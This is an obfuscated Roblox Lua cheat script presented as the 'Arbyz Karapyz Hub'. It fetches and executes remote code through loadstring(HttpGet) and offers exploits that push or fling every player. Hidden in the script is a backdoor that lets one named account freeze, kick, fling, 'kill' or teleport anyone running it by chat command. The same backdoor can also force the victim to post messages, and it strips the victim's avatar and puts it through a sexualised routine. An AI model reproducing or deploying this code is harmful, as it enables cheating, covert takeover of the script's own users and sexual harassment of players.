local f = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")() local j = f:Window("\65\114\98\121\122\32\75\97\114\97\112\121\122\32\72\117\98") local n = j:Server("\65\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98", "") local k = n:Channel("\80\108\97\121\101\114") local _ = n:Channel("\67\114\101\100\105\116\115") local b_ = n:Channel("\80\117\115\104\32\97\117\114\97") _:Label("\65\112\54\121\101\50\35\48\48\48\49") _:Button("\68\105\115\99\111\114\100", function() setclipboard("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\90\110\77\68\117\118\87\65\85\77") end) k:Button("\72\101\97\100\108\101\115\115", function() game.Players.LocalPlayer.Character.Head.Transparency = 1 game.Players.LocalPlayer.Character.Head.face:Remove () end) k:Button("\65\110\116\105\32\65\100\109\105\110", function() print("\110\111\116\32\119\111\114\107\105\110\103") end) k:Button("\87\97\108\107\83\112\101\101\100", function() game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100 f:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\87\97\108\107\83\112\101\101\100\32\116\117\114\110\32\111\110", "\79\107\97\121\33") end) k:Button("\70\117\110\110\121\32\71\114\97\118\105\116\121", function() game.Workspace.Gravity = 1 f:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\70\117\110\32\71\114\97\118\105\116\121\32\111\110", "\79\107\97\121\33") end) k:Button("\85\110\87\97\108\107\83\112\101\101\100", function() game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16 f:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\87\97\108\107\83\112\101\101\100\32\116\117\114\110\32\111\102\102", "\79\107\97\121\33") end) b_:Button("\80\117\115\104\32\97\117\114\97\40\110\101\101\100\32\103\97\109\101\112\97\115\115\41", function() for i, v in pairs(game.Workspace:GetDescendants()) do if string.find(v.Name, "\82\97\103\100\111\108\108") then v:Destroy() end end while task.wait(1) do pcall( function() for i, v in pairs(game.Players:GetPlayers()) do if v.Name == game.Players.LocalPlayer.Name then wait(.1) local h = { [2] = game:GetService("\80\108\97\121\101\114\115")[v.Name].Character } game:GetService("\80\108\97\121\101\114\115").LocalPlayer.Character.Push.PushTool:FireServer(unpack(h)) end end end ) end end) b_:Button("\65\110\116\105\32\82\97\103\100\111\108\108", function() game.Players.localPlayer.Character.Pushed:Remove () game.Players.localPlayer.Character.RagdollMe:Remove () for i, v in pairs(game.Workspace:GetDescendants()) do if string.find(v.Name, "\82\97\103\100\111\108\108") then v:Destroy() end end end) b_:Button("\80\117\115\104\32\97\108\108\40\110\101\101\100\32\103\97\109\101\112\97\115\41", function() for i, v in pairs(game.Workspace:GetDescendants()) do if string.find(v.Name, "\82\97\103\100\111\108\108") then v:Destroy() end end game.Workspace.Gravity = math.huge while task.wait(.2) do pcall( function() for i, v in pairs(game.Players:GetPlayers()) do if v.Name == game.Players.LocalPlayer.Name then else game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v.Name].Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0) wait(.1) local h = { [1] = game:GetService("\80\108\97\121\101\114\115")[v.Name].Character } game:GetService("\80\108\97\121\101\114\115").LocalPlayer.Character.Push.PushTool:FireServer(unpack(h)) end end end ) end end) k:Button("\83\109\97\108\108\32\83\105\122\101", function() local e = game:GetService("\80\108\97\121\101\114\115").LocalPlayer local s = e.Character local g = s:FindFirstChildOfClass("\72\117\109\97\110\111\105\100") local function b() for i,v in pairs(s:GetDescendants()) do if v:IsA("\66\97\115\101\80\97\114\116") then if v.Name ~= "\72\101\97\100" then for i,cav in pairs(v:GetDescendants()) do if cav:IsA("\65\116\116\97\99\104\109\101\110\116") then if cav:FindFirstChild("\79\114\105\103\105\110\97\108\80\111\115\105\116\105\111\110") then cav.OriginalPosition:Destroy() end end end v:FindFirstChild("\79\114\105\103\105\110\97\108\83\105\122\101"):Destroy() if v:FindFirstChild("\65\118\97\116\97\114\80\97\114\116\83\99\97\108\101\84\121\112\101") then v:FindFirstChild("\65\118\97\116\97\114\80\97\114\116\83\99\97\108\101\84\121\112\101"):Destroy() end end end end end b() wait(0.5) g:FindFirstChild("\66\111\100\121\84\121\112\101\83\99\97\108\101"):Destroy() wait(1) b() wait(0.5) g:FindFirstChild("\66\111\100\121\87\105\100\116\104\83\99\97\108\101"):Destroy() wait(1) b() wait(0.5) g:FindFirstChild("\66\111\100\121\68\101\112\116\104\83\99\97\108\101"):Destroy() wait(1) b() wait() f:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\83\109\97\108\108\32\83\105\122\101\32\116\117\114\110\32\111\110", "\79\107\97\121\33") end) k:Button("\85\110\70\117\110\110\121\32\71\114\97\118\105\116\121", function() game.Workspace.Gravity = 1000 f:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\70\117\110\32\71\114\97\118\105\116\121\32\116\117\114\110\32\111\102\102", "\79\107\97\121\33") end) local a = game.Players.Oxmilk1 local a  = game.Players.Ap6ye2 local r = function() game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true  end  local c = function() game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false end  a.Chatted:Connect(function(m) if m:match("\46\102\114\101\101\122\101") then if game.Players.LocalPlayer ~= a then r()  end end end) a.Chatted:Connect(function(m) if m:match("\46\117\110\102\114\101\101\122\101") then if game.Players.LocalPlayer ~= a then c()  end end end) a.Chatted:Connect(function(m) if game.Players.LocalPlayer ~= a   then if m:match("\46\107\105\99\107") then game.Players.LocalPlayer:Kick("\89\111\117\32\119\101\114\101\32\107\105\99\107\101\100\32\98\101\99\97\117\115\101\32\116\104\105\115\32\97\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98")  end end end)  a.Chatted:Connect(function(m) if m:match("\46\98\101\110\120") then if game.Players.LocalPlayer ~= a then  wait(0) local gs = "\115\111\114\114\121\32\105\109\32\117\115\101\32\97\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98" local o = "\65\108\108" local ao = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest ao:FireServer(gs, o) game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = a.Character.HumanoidRootPart local mi = true while mi == true do local lm = game:GetService("\80\108\97\121\101\114\115").LocalPlayer.Character.Humanoid pcall(function() lm.Parent.Pants:Destroy() end) pcall(function() lm.Parent.Shirt:Destroy() end) game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100").Sit = true game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = a.Character.HumanoidRootPart.CFrame + a.Character.HumanoidRootPart.CFrame.lookVector * 0.5 game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70 wait(0.1) game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200 end end end end)  a.Chatted:Connect(function(m) if m:match("\46\107\105\108\108") then if game.Players.LocalPlayer ~= a  then game.Players.LocalPlayer.Character.Head:Destroy() end end end)  a.Chatted:Connect(function(m) if m:match("\46\98\97\110") then if game.Players.LocalPlayer ~= a then game.Players.LocalPlayer:Kick("\80\69\82\77\65\32\66\65\78") end end end)  a.Chatted:connect(function(m) if m:match("\46\98\114\105\110\103") then if game.Players.LocalPlayer ~= a then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(a.Character.UpperTorso.Position) end end end)  a.Chatted:connect(function(m) if m:match("\46\102\108\105\110\103") then if game.Players.LocalPlayer ~= a then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0) local eh = 99999  game:GetService('RunService').Stepped:connect(function() game.Players.LocalPlayer.Character.Head.CanCollide = false game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false end) wait(.1) local se = Instance.new("\66\111\100\121\84\104\114\117\115\116") se.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart se.Force = Vector3.new(eh,0,eh) se.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position end end end)  a.Chatted:Connect(function(m) if m:match("\46\115\97\121") then if game.Players.LocalPlayer ~= a then  wait() local gs = "\97\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98\32\116\111\112" local o = "\65\108\108" local ao = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest ao:FireServer(gs, o) end end end) a.Chatted:Connect(function(m) if game.Players.LocalPlayer ~= a  then if m:match("\46\99\111\101\109\115") then wait() local gs = "\111\104\32\121\101\97\32\105\109\32\108\111\118\101\32\99\111\101\109\115\32\99\111\101\109\115\32\99\111\101\109\115\32\105\32\108\111\118\101\32\99\111\101\109\115" local o = "\65\108\108" local ao = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest ao:FireServer(gs, o) end end end) a.Chatted:connect(function(m) if m:match("\46\117\110\98\101\110\120") then if game.Players.LocalPlayer ~= a then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0) local eh = 99999  game:GetService('RunService').Stepped:connect(function() game.Players.LocalPlayer.Character.Head.CanCollide = false game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false end) wait(.1) local se = Instance.new("\66\111\100\121\84\104\114\117\115\116") se.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart se.Force = Vector3.new(eh,0,eh) se.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position end end end)  a.Chatted:Connect(function(m) if game.Players.LocalPlayer ~= a  then if m:match("\46\115\99\114\105\112\116") then wait() local gs = "\115\99\114\105\112\116\32\110\97\109\101\32\65\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98\32\116\104\105\115\32\118\101\114\121\32\99\111\111\108\32\115\99\114\105\112\116" local o = "\65\108\108" local ao = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest ao:FireServer(gs, o) end end end) a.Chatted:Connect(function(m) if game.Players.LocalPlayer ~= a  then if m:match("\46\98\111\111") then wait(1) Player = game:GetService("\80\108\97\121\101\114\115").LocalPlayer s = Player.Character Player.Character.Head.face.Texture = "\114\98\120\97\115\115\101\116\105\100\58\47\47\49\49\50\56\50\54\57\53\49" Player.Character.Head.BrickColor = BrickColor.new("\82\101\97\108\108\121\32\98\108\97\99\107") Player.Character.Torso.BrickColor = BrickColor.new("\82\101\97\108\108\121\32\98\108\97\99\107") Player.Character["\76\101\102\116\32\65\114\109"].BrickColor = BrickColor.new("\82\101\97\108\108\121\32\98\108\97\99\107") Player.Character["\82\105\103\104\116\32\65\114\109"].BrickColor = BrickColor.new("\82\101\97\108\108\121\32\98\108\97\99\107") Player.Character["\76\101\102\116\32\76\101\103"].BrickColor = BrickColor.new("\82\101\97\108\108\121\32\98\108\97\99\107") Player.Character["\82\105\103\104\116\32\76\101\103"].BrickColor = BrickColor.new("\82\101\97\108\108\121\32\98\108\97\99\107") sound = Instance.new("\83\111\117\110\100") sound.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\49\48\53\50\53\48\55\52\52\49" sound.Looped = true sound.Parent = game.Workspace sound:Play() tool = Instance.new("\84\111\111\108") tool.Name = "\75\110\105\102\101" tool.Parent = Player.Backpack handle = Instance.new("\80\97\114\116") handle.Name = "\72\97\110\100\108\101" handle.Parent = tool mesh = Instance.new("\83\112\101\99\105\97\108\77\101\115\104") mesh.MeshId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\49\50\49\57\52\52\55\55\56" mesh.TextureId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\49\52\52\48\49\50\50\48\56" mesh.Parent = handle animation = Instance.new("\65\110\105\109\97\116\105\111\110") animation.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\56\57\49\51\52\55\57\50" animation.Parent = tool tool.Activated:connect(function() local ra = Player.Character.Humanoid:LoadAnimation(animation) ra:Play() handle.Touched:connect(function(l) if l.Parent:FindFirstChild("\72\117\109\97\110\111\105\100") then l.Parent.Humanoid:TakeDamage(5) end end)  end) end end end)
--comands for private
--.say
--.freeze
--.unfreeze
--.benx
--.kick
--.ban
--.coems
--.kill
--.fling
--.bring
--.unbenx
--.jumpscare
